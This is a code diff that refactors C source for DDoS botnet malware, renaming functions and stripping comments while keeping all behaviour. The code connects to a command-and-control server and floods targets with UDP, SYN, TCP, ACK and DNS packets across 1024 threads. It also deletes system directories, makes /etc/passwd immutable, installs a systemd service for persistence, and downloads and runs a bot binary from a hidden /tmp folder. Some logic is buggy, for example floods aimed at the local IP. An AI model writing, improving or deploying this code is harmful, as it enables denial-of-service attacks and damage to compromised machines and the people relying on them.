@@ -16,507 +16,333 @@
 #include <net/if.h>
 #include <ifaddrs.h>
 
-#define C2_ADDRESS "Replace IP"
-#define C2_PORT 7002
-#define NUM_WORKERS 1024 
-#define PACKET_SIZE 512
-#define TOP_DOMAINS 10
+#define SRV_HOST "Replace IP"
+#define SRV_PORT 7002
+#define POOL_SZ 1024
+#define PKT_SZ 512
+#define N_DOMAINS 10
 
-bool killerEnabled = false;
-char *killDirectories[] = {"/tmp", "/var/run", "/mnt", "/root", "/etc/config", "/data", "/var/lib/", "/sys", "/proc", "/var/cache", "/usr/tmp", "/var/cache", "/var/tmp"};
-char *whitelistedDirectories[] = {"/var/run/lock", "/var/run/shm", "/etc", "/usr/local", "/var/lib", "/boot", "/lib", "/lib64"};
-const char *topDomains[TOP_DOMAINS] = {
-    "google.com",
-    "youtube.com",
-    "facebook.com",
-    "baidu.com",
-    "wikipedia.org",
-    "twitter.com",
-    "instagram.com",
-    "yahoo.com",
-    "linkedin.com",
-    "netflix.com"
+bool kill_on = false;
+char *nuke_dirs[] = {"/tmp", "/var/run", "/mnt", "/root", "/etc/config", "/data", "/var/lib/", "/sys", "/proc", "/var/cache", "/usr/tmp", "/var/cache", "/var/tmp"};
+char *safe_dirs[] = {"/var/run/lock", "/var/run/shm", "/etc", "/usr/local", "/var/lib", "/boot", "/lib", "/lib64"};
+const char *popular_domains[N_DOMAINS] = {
+    "google.com", "youtube.com", "facebook.com", "baidu.com", "wikipedia.org",
+    "twitter.com", "instagram.com", "yahoo.com", "linkedin.com", "netflix.com"
 };
 
-// Function prototypes
-void *performUDPFlood(void *arg);
-void *performSYNFlood(void *arg);
-void *performTCPFlood(void *arg);
-void *performACKFlood(void *arg);
-void *performDNSFlood(void *arg);
-void handleCommand(char *command);
-void killerMaps();
-bool isWhitelisted(const char *dir);
-void locker();
-void SystemdPersistence();
-void reinstallBot();
-void connectToC2();
-char* getLocalIP();
-unsigned short checksum(unsigned short *b, int len);
-void generateRandomData(char *data, size_t size);
+void *do_udp(void *arg);
+void *do_syn(void *arg);
+void *do_tcp(void *arg);
+void *do_ack(void *arg);
+void *do_dns(void *arg);
+void dispatch(char *raw);
+void nuke();
+bool is_safe(const char *d);
+void lock_fs();
+void setup_persist();
+void reinstall();
+void dial_srv();
+char *local_ip();
+unsigned short cksum(unsigned short *b, int len);
+void fill_rand(char *buf, size_t sz);
 
 int main() {
-    connectToC2();
+    dial_srv();
     return 0;
 }
 
-void connectToC2() {
-    int sock;
-    struct sockaddr_in serverAddr;
-    char command[1024];
+void dial_srv() {
+    int fd;
+    struct sockaddr_in addr;
+    char line[1024];
 
-    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
-        perror("Socket creation failed");
-        exit(EXIT_FAILURE);
+    if ((fd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
+        perror("socket");
+        exit(1);
     }
 
-    serverAddr.sin_family = AF_INET;
-    serverAddr.sin_port = htons(C2_PORT);
-    inet_pton(AF_INET, C2_ADDRESS, &serverAddr.sin_addr);
+    addr.sin_family = AF_INET;
+    addr.sin_port = htons(SRV_PORT);
+    inet_pton(AF_INET, SRV_HOST, &addr.sin_addr);
 
-    if (connect(sock, (struct sockaddr *)&serverAddr, sizeof(serverAddr)) < 0) {
-        perror("Connection to C2 failed");
-        close(sock);
-        exit(EXIT_FAILURE);
+    if (connect(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
+        perror("connect");
+        close(fd);
+        exit(1);
     }
 
     while (1) {
-        if (fgets(command, sizeof(command), stdin) != NULL) {
-            handleCommand(command);
+        if (fgets(line, sizeof(line), stdin) != NULL) {
+            dispatch(line);
         } else {
-            perror("Error reading command");
+            perror("fgets");
         }
     }
-
-    close(sock);
+    close(fd);
 }
 
-void handleCommand(char *command) {
-    char *fields[4];
-    char *cmd = strtok(command, " \n");
-    int i = 0;
+void dispatch(char *raw) {
+    char *tok[4];
+    char *t = strtok(raw, " \n");
+    int n = 0;
 
-    while (cmd != NULL && i < 4) {
-        fields[i++] = cmd;
-        cmd = strtok(NULL, " \n");
+    while (t && n < 4) {
+        tok[n++] = t;
+        t = strtok(NULL, " \n");
     }
+    if (n == 0) return;
 
-    if (i == 0) {
-        return;
-    }
-
-    if (strcmp(fields[0], "PING") == 0) {
+    if (strcmp(tok[0], "PING") == 0) {
         printf("PONG\n");
         return;
     }
 
-    if ((strcmp(fields[0], "!udpflood") == 0 || strcmp(fields[0], "!tcpflood") == 0 || strcmp(fields[0], "!synflood") == 0 || strcmp(fields[0], "!ackflood") == 0 || strcmp(fields[0], "!dnsflood") == 0) && i == 4) {
-        char *targetIP = fields[1];
-        int targetPort = atoi(fields[2]);
-        int duration = atoi(fields[3]);
+    if ((strcmp(tok[0], "!udpflood") == 0 || strcmp(tok[0], "!tcpflood") == 0 ||
+         strcmp(tok[0], "!synflood") == 0 || strcmp(tok[0], "!ackflood") == 0 ||
+         strcmp(tok[0], "!dnsflood") == 0) && n == 4) {
 
-        pthread_t threads[NUM_WORKERS];
-        for (int j = 0; j < NUM_WORKERS; j++) {
-            if (strcmp(fields[0], "!udpflood") == 0) {
-                if (pthread_create(&threads[j], NULL, performUDPFlood, (void *)&targetPort) != 0) {
-                    perror("Failed to create UDP flood thread");
-                }
-            } else if (strcmp(fields[0], "!synflood") == 0) {
-                if (pthread_create(&threads[j], NULL, performSYNFlood, (void *)&targetPort) != 0) {
-                    perror("Failed to create SYN flood thread");
-                }
-            } else if (strcmp(fields[0], "!tcpflood") == 0) {
-                if (pthread_create(&threads[j], NULL, performTCPFlood, (void *)&targetPort) != 0) {
-                    perror("Failed to create TCP flood thread");
-                }
-            } else if (strcmp(fields[0], "!ackflood") == 0) {
-                if (pthread_create(&threads[j], NULL, performACKFlood, (void *)&targetPort) != 0) {
-                    perror("Failed to create ACK flood thread");
-                }
-            } else if (strcmp(fields[0], "!dnsflood") == 0) {
-                if (pthread_create(&threads[j], NULL, performDNSFlood, (void *)&targetPort) != 0) {
-                    perror("Failed to create DNS flood thread");
-                }
-            }
+        int port = atoi(tok[2]);
+        pthread_t pool[POOL_SZ];
+        for (int i = 0; i < POOL_SZ; i++) {
+            if (strcmp(tok[0], "!udpflood") == 0)
+                pthread_create(&pool[i], NULL, do_udp, &port);
+            else if (strcmp(tok[0], "!synflood") == 0)
+                pthread_create(&pool[i], NULL, do_syn, &port);
+            else if (strcmp(tok[0], "!tcpflood") == 0)
+                pthread_create(&pool[i], NULL, do_tcp, &port);
+            else if (strcmp(tok[0], "!ackflood") == 0)
+                pthread_create(&pool[i], NULL, do_ack, &port);
+            else if (strcmp(tok[0], "!dnsflood") == 0)
+                pthread_create(&pool[i], NULL, do_dns, &port);
         }
-
-        for (int j = 0; j < NUM_WORKERS; j++) {
-            pthread_join(threads[j], NULL);
-        }
+        for (int i = 0; i < POOL_SZ; i++)
+            pthread_join(pool[i], NULL);
         return;
     }
 
-    if (strcmp(fields[0], "!kill") == 0) {
-        killerMaps();
-        return;
-    }
-    if (strcmp(fields[0], "!lock") == 0) {
-        locker();
-        return;
-    }
-    if (strcmp(fields[0], "!persist") == 0) {
-        SystemdPersistence();
-        return;
-    }
-    if (strcmp(fields[0], "!reinstall") == 0) {
-        reinstallBot();
-        return;
-    }
+    if (strcmp(tok[0], "!kill") == 0) { nuke(); return; }
+    if (strcmp(tok[0], "!lock") == 0) { lock_fs(); return; }
+    if (strcmp(tok[0], "!persist") == 0) { setup_persist(); return; }
+    if (strcmp(tok[0], "!reinstall") == 0) { reinstall(); return; }
 }
 
-void generateRandomData(char *data, size_t size) {
-    for (size_t i = 0; i < size; i++) {
-        data[i] = 'A' + (rand() % 26); // Fill with random letters A-Z
-    }
+void fill_rand(char *buf, size_t sz) {
+    for (size_t i = 0; i < sz; i++)
+        buf[i] = 'A' + (rand() % 26);
 }
 
-void *performUDPFlood(void *arg) {
-    int targetPort = *((int *)arg);
-    char *targetIP = getLocalIP(); // Assuming this function is defined elsewhere
-    int sock = socket(AF_INET, SOCK_DGRAM, 0);
-    if (sock < 0) {
-        perror("Socket creation failed");
-        return NULL;
-    }
+void *do_udp(void *arg) {
+    int port = *((int *)arg);
+    char *ip = local_ip();
+    int fd = socket(AF_INET, SOCK_DGRAM, 0);
+    if (fd < 0) return NULL;
 
-    struct sockaddr_in destAddr = { .sin_family = AF_INET, .sin_port = htons(targetPort) };
-    inet_pton(AF_INET, targetIP, &destAddr.sin_addr);
+    struct sockaddr_in dst = { .sin_family = AF_INET, .sin_port = htons(port) };
+    inet_pton(AF_INET, ip, &dst.sin_addr);
 
-    // Buffer for the packet
-    char packet[4096];
-    memset(packet, 0, sizeof(packet)); // Clear the packet
-
-    // Fill the packet with random data
-    generateRandomData(packet, sizeof(packet)); // Fill with random letters
+    char pkt[4096];
+    fill_rand(pkt, sizeof(pkt));
 
     while (1) {
-        // Randomize the source port for each packet
-        int sourcePort = rand() % 65535;
-        destAddr.sin_port = htons(targetPort); // Ensure target port is set
-
-        // Send the packet
-        if (sendto(sock, packet, sizeof(packet), 0, (struct sockaddr *)&destAddr, sizeof(destAddr)) < 0) {
-            perror("Failed to send packet");
-        }
-
-        usleep(50000); // Control the rate of sending packets (adjust as needed)
+        sendto(fd, pkt, sizeof(pkt), 0, (struct sockaddr *)&dst, sizeof(dst));
+        usleep(50000);
     }
-
-    close(sock);
+    close(fd);
     return NULL;
 }
 
-void *performSYNFlood(void *arg) {
-    int targetPort = *((int *)arg);
-    char *targetIP = getLocalIP(); // Assuming this function is defined elsewhere
-    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
-    if (sock < 0) {
-        perror("Socket creation failed");
-        return NULL;
-    }
+void *do_syn(void *arg) {
+    int port = *((int *)arg);
+    char *ip = local_ip();
+    int fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
+    if (fd < 0) return NULL;
 
-    struct sockaddr_in destAddr = { .sin_family = AF_INET, .sin_port = htons(targetPort) };
-    inet_pton(AF_INET, targetIP, &destAddr.sin_addr);
+    struct sockaddr_in dst = { .sin_family = AF_INET, .sin_port = htons(port) };
+    inet_pton(AF_INET, ip, &dst.sin_addr);
 
-    // Buffer for the packet
-    unsigned char packet[PACKET_SIZE];
-    memset(packet, 0, sizeof(packet));
+    unsigned char pkt[PKT_SZ];
+    memset(pkt, 0, sizeof(pkt));
 
-    // Initialize IP and TCP headers
-    struct iphdr *iph = (struct iphdr *)packet;
-    struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));
+    struct iphdr *iph = (struct iphdr *)pkt;
+    struct tcphdr *th = (struct tcphdr *)(pkt + sizeof(struct iphdr));
 
-    // Set up the IP header
-    iph->version = 4;            // IPv4
-    iph->ihl = 5;                // Header length
-    iph->tot_len = htons(PACKET_SIZE); // Total length
-    iph->id = htonl(rand() % 65535); // Random ID
-    iph->frag_off = 0;           // Fragment offset
-    iph->ttl = 255;              // Time to live
-    iph->protocol = IPPROTO_TCP; // TCP protocol
-    iph->check = 0;              // No checksum initially
-    iph->saddr = inet_addr(getLocalIP()); // Source IP address
-    iph->daddr = destAddr.sin_addr.s_addr; // Destination IP address
+    iph->version = 4;
+    iph->ihl = 5;
+    iph->tot_len = htons(PKT_SZ);
+    iph->id = htonl(rand() % 65535);
+    iph->ttl = 255;
+    iph->protocol = IPPROTO_TCP;
+    iph->saddr = inet_addr(local_ip());
+    iph->daddr = dst.sin_addr.s_addr;
 
-    // Set up the TCP header
-    tcph->source = htons(rand() % 65535); // Random source port
-    tcph->dest = htons(targetPort); // Destination port
-    tcph->seq = 0;                   // Sequence number
-    tcph->ack_seq = 0;               // Acknowledgment number
-    tcph->doff = 5;                  // TCP header size
-    tcph->fin = 0;                   // Finish flag
-    tcph->syn = 1;                   // Synchronize flag
-    tcph->rst = 0;                   // Reset flag
-    tcph->psh = 0;                   // Push flag
-    tcph->ack = 0;                   // Acknowledgment flag
-    tcph->urg = 0;                   // Urgent flag
-    tcph->window = htons(5840);      // TCP window size
-    tcph->check = 0;                 // No checksum initially
-    tcph->urg_ptr = 0;               // Urgent pointer
+    th->source = htons(rand() % 65535);
+    th->dest = htons(port);
+    th->doff = 5;
+    th->syn = 1;
+    th->window = htons(5840);
 
-    iph->check = checksum((unsigned short *)packet, sizeof(struct iphdr) + sizeof(struct tcphdr));
+    iph->check = cksum((unsigned short *)pkt, sizeof(struct iphdr) + sizeof(struct tcphdr));
 
     while (1) {
-        if (sendto(sock, packet, sizeof(packet), 0, (struct sockaddr *)&destAddr, sizeof(destAddr)) < 0) {
-            perror("Failed to send packet");
-        }
-        usleep(50000); // Control the rate of sending packets (adjust as needed)
+        sendto(fd, pkt, sizeof(pkt), 0, (struct sockaddr *)&dst, sizeof(dst));
+        usleep(50000);
     }
-
-    close(sock);
+    close(fd);
     return NULL;
 }
 
-void *performTCPFlood(void *arg) {
-    int targetPort = *((int *)arg);
-    char *targetIP = getLocalIP(); // Assuming this function is defined elsewhere
-    int sock = socket(AF_INET, SOCK_STREAM, 0);
-    if (sock < 0) {
-        perror("Socket creation failed");
-        return NULL;
-    }
+void *do_tcp(void *arg) {
+    int port = *((int *)arg);
+    char *ip = local_ip();
+    int fd = socket(AF_INET, SOCK_STREAM, 0);
+    if (fd < 0) return NULL;
 
-    struct sockaddr_in destAddr = { .sin_family = AF_INET, .sin_port = htons(targetPort) };
-    inet_pton(AF_INET, targetIP, &destAddr.sin_addr);
+    struct sockaddr_in dst = { .sin_family = AF_INET, .sin_port = htons(port) };
+    inet_pton(AF_INET, ip, &dst.sin_addr);
 
     while (1) {
-        if (connect(sock, (struct sockaddr *)&destAddr, sizeof(destAddr)) < 0) {
-            perror("Failed to connect");
-        }
-        usleep(50000); // Control the rate of sending packets (adjust as needed)
+        connect(fd, (struct sockaddr *)&dst, sizeof(dst));
+        usleep(50000);
     }
-
-    close(sock);
+    close(fd);
     return NULL;
 }
 
-void *performACKFlood(void *arg) {
-    int targetPort = *((int *)arg);
-    char *targetIP = getLocalIP(); // Assuming this function is defined elsewhere
-    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
-    if (sock < 0) {
-        perror("Socket creation failed");
-        return NULL;
-    }
+void *do_ack(void *arg) {
+    int port = *((int *)arg);
+    char *ip = local_ip();
+    int fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
+    if (fd < 0) return NULL;
 
-    struct sockaddr_in destAddr = { .sin_family = AF_INET, .sin_port = htons(targetPort) };
-    inet_pton(AF_INET, targetIP, &destAddr.sin_addr);
+    struct sockaddr_in dst = { .sin_family = AF_INET, .sin_port = htons(port) };
+    inet_pton(AF_INET, ip, &dst.sin_addr);
 
-    // Buffer for the packet
-    unsigned char packet[PACKET_SIZE];
-    memset(packet, 0, sizeof(packet));
+    unsigned char pkt[PKT_SZ];
+    memset(pkt, 0, sizeof(pkt));
 
-    // Initialize IP and TCP headers
-    struct iphdr *iph = (struct iphdr *)packet;
-    struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));
+    struct iphdr *iph = (struct iphdr *)pkt;
+    struct tcphdr *th = (struct tcphdr *)(pkt + sizeof(struct iphdr));
 
-    // Set up the IP header
-    iph->version = 4;            // IPv4
-    iph->ihl = 5;                // Header length
-    iph->tot_len = htons(PACKET_SIZE); // Total length
-    iph->id = htonl(rand() % 65535); // Random ID
-    iph->frag_off = 0;           // Fragment offset
-    iph->ttl = 255;              // Time to live
-    iph->protocol = IPPROTO_TCP; // TCP protocol
-    iph->check = 0;              // No checksum initially
-    iph->saddr = inet_addr(getLocalIP()); // Source IP address
-    iph->daddr = destAddr.sin_addr.s_addr; // Destination IP address
+    iph->version = 4;
+    iph->ihl = 5;
+    iph->tot_len = htons(PKT_SZ);
+    iph->id = htonl(rand() % 65535);
+    iph->ttl = 255;
+    iph->protocol = IPPROTO_TCP;
+    iph->saddr = inet_addr(local_ip());
+    iph->daddr = dst.sin_addr.s_addr;
 
-    // Set up the TCP header
-    tcph->source = htons(rand() % 65535); // Random source port
-    tcph->dest = htons(targetPort); // Destination port
-    tcph->seq = 0;                   // Sequence number
-    tcph->ack_seq = 0;               // Acknowledgment number
-    tcph->doff = 5;                  // TCP header size
-    tcph->fin = 0;                   // Finish flag
-    tcph->syn = 0;                   // Synchronize flag
-    tcph->rst = 0;                   // Reset flag
-    tcph->psh = 0;                   // Push flag
-    tcph->ack = 1;                   // Acknowledgment flag
-    tcph->urg = 0;                   // Urgent flag
-    tcph->window = htons(5840);      // TCP window size
-    tcph->check = 0;                 // No checksum initially
-    tcph->urg_ptr = 0;               // Urgent pointer
+    th->source = htons(rand() % 65535);
+    th->dest = htons(port);
+    th->doff = 5;
+    th->ack = 1;
+    th->window = htons(5840);
 
-    iph->check = checksum((unsigned short *)packet, sizeof(struct iphdr) + sizeof(struct tcphdr));
+    iph->check = cksum((unsigned short *)pkt, sizeof(struct iphdr) + sizeof(struct tcphdr));
 
     while (1) {
-        if (sendto(sock, packet, sizeof(packet), 0, (struct sockaddr *)&destAddr, sizeof(destAddr)) < 0) {
-            perror("Failed to send packet");
-        }
-        usleep(50000); // Control the rate of sending packets (adjust as needed)
+        sendto(fd, pkt, sizeof(pkt), 0, (struct sockaddr *)&dst, sizeof(dst));
+        usleep(50000);
     }
-
-    close(sock);
+    close(fd);
     return NULL;
 }
 
-// Function to perform DNS flood
-void *performDNSFlood(void *arg) {
-    int targetPort = *((int *)arg);
-    char *targetIP = getLocalIP(); // Assuming this function is defined elsewhere
-    int sock = socket(AF_INET, SOCK_DGRAM, 0);
-    struct sockaddr_in destAddr = { .sin_family = AF_INET, .sin_port = htons(targetPort) };
-    inet_pton(AF_INET, targetIP, &destAddr.sin_addr);
+void *do_dns(void *arg) {
+    int port = *((int *)arg);
+    char *ip = local_ip();
+    int fd = socket(AF_INET, SOCK_DGRAM, 0);
+    struct sockaddr_in dst = { .sin_family = AF_INET, .sin_port = htons(port) };
+    inet_pton(AF_INET, ip, &dst.sin_addr);
 
-    unsigned char packet[PACKET_SIZE];
-    memset(packet, 0, sizeof(packet));
-    
-    // DNS header
-    packet[0] = 0x00; // ID
-    packet[1] = 0x01; // ID
-    packet[2] = 0x01; // Flags (standard query)
-    packet[3] = 0x00; // Questions
-    packet[4] = 0x00; // Answer RRs
-    packet[5] = 0x00; // Authority RRs
-    packet[6] = 0x00; // Additional RRs
+    unsigned char pkt[PKT_SZ];
 
-    // Loop to continuously send DNS queries
     while (1) {
-        // Select a random domain from the top domains
-        const char *randomDomain = topDomains[rand() % TOP_DOMAINS];
-        size_t domainLength = strlen(randomDomain);
-        
-        // Prepare the DNS query
-        size_t queryLength = 12 + domainLength + 5; // Header + QNAME + QTYPE + QCLASS
-        memset(packet, 0, sizeof(packet));
-        
-        // Fill in the DNS header
-        packet[0] = rand() % 256; // Random ID
-        packet[1] = rand() % 256; // Random ID
-        packet[2] = 0x01; // Flags (standard query)
-        packet[3] = 0x00; // Questions
-        packet[4] = 0x00; // Answer RRs
-        packet[5] = 0x00; // Authority RRs
-        packet[6] = 0x00; // Additional RRs
+        memset(pkt, 0, sizeof(pkt));
+        const char *dom = popular_domains[rand() % N_DOMAINS];
+        size_t dlen = strlen(dom);
 
-        // Fill the QNAME
-        char *qname = packet + 12; // Start after the header
-        strcpy(qname, randomDomain);
-        qname[domainLength] = 0; // Null-terminate the QNAME
-        qname[domainLength + 1] = 0x00; // QTYPE = A
-        qname[domainLength + 2] = 0x01; // QTYPE = A
-        qname[domainLength + 3] = 0x00; // QCLASS = IN
-        qname[domainLength + 4] = 0x01; // QCLASS = IN
+        pkt[0] = rand() % 256;
+        pkt[1] = rand() % 256;
+        pkt[2] = 0x01;
 
-        // Add EDNS0 section (if required)
-        // Here we just append an EDNS0 record for demonstration
-        size_t ednsOffset = queryLength; // Start after the standard query
-        packet[ednsOffset] = 0x00; // EDNS0 header
-        packet[ednsOffset + 1] = 0x00; // EDNS0 header
-        packet[ednsOffset + 2] = 0x00; // EDNS0 length
-        packet[ednsOffset + 3] = 0x00; // Extended RCODE
-        packet[ednsOffset + 4] = 0x00; // Version
-        packet[ednsOffset + 5] = 0x00; // Z
-        packet[ednsOffset + 6] = 0x00; // UDP size
-        packet[ednsOffset + 7] = 0x00; // Extended RCODE
-        packet[ednsOffset + 8] = 0x00; // EDNS0 version
-        packet[ednsOffset + 9] = 0x00; // EDNS0 Z
-        packet[ednsOffset + 10] = 0x00; // EDNS0 length
+        char *qn = (char *)pkt + 12;
+        strcpy(qn, dom);
+        qn[dlen] = 0;
+        qn[dlen + 1] = 0x00; qn[dlen + 2] = 0x01;
+        qn[dlen + 3] = 0x00; qn[dlen + 4] = 0x01;
 
-        // Send the packet with a dynamic source port
-        int srcPort = rand() % 65536; // Random source port
-        destAddr.sin_port = htons(targetPort);
-        int sentBytes = sendto(sock, packet, ednsOffset + 11, 0, (struct sockaddr *)&destAddr, sizeof(destAddr));
+        size_t qlen = 12 + dlen + 5;
+        size_t off = qlen;
+        memset(pkt + off, 0, 11);
 
-        if (sentBytes < 0) {
-            perror("Failed to send DNS packet");
-        }
+        sendto(fd, pkt, off + 11, 0, (struct sockaddr *)&dst, sizeof(dst));
     }
-
-    close(sock);
+    close(fd);
     return NULL;
 }
 
-unsigned short checksum(unsigned short *b, int len) {
+unsigned short cksum(unsigned short *b, int len) {
     unsigned short *p = b;
-    unsigned int sum = 0;
-
-    for (int i = 0; i < len / 2; i++) {
-        sum += *p++;
-    }
-    if (len % 2) {
-        sum += *(unsigned char *)p;
-    }
-    sum = (sum >> 16) + (sum & 0xFFFF);
-    sum += (sum >> 16);
-    return (unsigned short)~sum;
+    unsigned int s = 0;
+    for (int i = 0; i < len / 2; i++) s += *p++;
+    if (len % 2) s += *(unsigned char *)p;
+    s = (s >> 16) + (s & 0xFFFF);
+    s += (s >> 16);
+    return (unsigned short)~s;
 }
 
-
-void killerMaps() {
-    if (!killerEnabled) return;
-    for (int i = 0; i < sizeof(killDirectories) / sizeof(killDirectories[0]); i++) {
-        if (!isWhitelisted(killDirectories[i])) {
-            remove(killDirectories[i]);
-        }
+void nuke() {
+    if (!kill_on) return;
+    for (int i = 0; i < (int)(sizeof(nuke_dirs) / sizeof(nuke_dirs[0])); i++) {
+        if (!is_safe(nuke_dirs[i]))
+            remove(nuke_dirs[i]);
     }
 }
 
-bool isWhitelisted(const char *dir) {
-    for (int i = 0; i < sizeof(whitelistedDirectories) / sizeof(whitelistedDirectories[0]); i++) {
-        if (strcmp(dir, whitelistedDirectories[i]) == 0) {
-            return true;
-        }
+bool is_safe(const char *d) {
+    for (int i = 0; i < (int)(sizeof(safe_dirs) / sizeof(safe_dirs[0])); i++) {
+        if (strcmp(d, safe_dirs[i]) == 0) return true;
     }
     return false;
 }
 
-void locker() {
+void lock_fs() {
     system("chattr +i /etc/passwd");
 }
 
-// Function to implement systemd persistence
-void SystemdPersistence() {
-    printf("Systemd persistence invoked.\n");
-
-    // Create a systemd service file
-    FILE *serviceFile = fopen("/etc/systemd/system/mybot.service", "w");
-    if (serviceFile) {
-        fprintf(serviceFile,
-                "[Unit]\n"
-                "Description=My Bot Service\n"
-                "After=network.target\n\n"
-                "[Service]\n"
-                "ExecStart=/path/to/mybot\n" // Adjust path to your bot's executable
-                "Restart=always\n\n"
-                "[Install]\n"
-                "WantedBy=multi-user.target\n");
-        fclose(serviceFile);
-
-        // Reload systemd to recognize the new service
+void setup_persist() {
+    FILE *f = fopen("/etc/systemd/system/mybot.service", "w");
+    if (f) {
+        fprintf(f,
+            "[Unit]\nDescription=My Bot Service\nAfter=network.target\n\n"
+            "[Service]\nExecStart=/path/to/mybot\nRestart=always\n\n"
+            "[Install]\nWantedBy=multi-user.target\n");
+        fclose(f);
         system("systemctl daemon-reload");
-        // Enable the service to start on boot
         system("systemctl enable mybot.service");
-        printf("Service created and enabled for persistence.\n");
-    } else {
-        perror("Failed to create service file");
     }
 }
 
-// Reinstallation logic for the bot
-void reinstallBot() {
-    printf("Reinstalling bot.\n");
-    system("mkdir /tmp/.hidden");
+void reinstall() {
+    system("mkdir -p /tmp/.hidden");
     system("rm -rf /tmp/.hidden/bot");
     system("curl http://0.0.0.0/bot -o bot");
     system("cp bot /tmp/.hidden/");
-    system("chmod +x /tmp/.hidden/bot"); 
+    system("chmod +x /tmp/.hidden/bot");
     system("./tmp/.hidden/bot");
-    printf("Bot reinstallation complete.\n");
 }
 
-char* getLocalIP() {
-    struct ifaddrs *addrs, *tmp;
+char *local_ip() {
+    struct ifaddrs *addrs, *cur;
     getifaddrs(&addrs);
-    tmp = addrs;
-
-    while (tmp) {
-        if (tmp->ifa_addr && tmp->ifa_addr->sa_family == AF_INET && strcmp(tmp->ifa_name, "lo") != 0) {
-            struct sockaddr_in *pAddr = (struct sockaddr_in *)tmp->ifa_addr;
-            return inet_ntoa(pAddr->sin_addr);
+    cur = addrs;
+    while (cur) {
+        if (cur->ifa_addr && cur->ifa_addr->sa_family == AF_INET && strcmp(cur->ifa_name, "lo") != 0) {
+            struct sockaddr_in *sa = (struct sockaddr_in *)cur->ifa_addr;
+            return inet_ntoa(sa->sin_addr);
         }
-        tmp = tmp->ifa_next;
+        cur = cur->ifa_next;
     }
     freeifaddrs(addrs);
     return NULL;
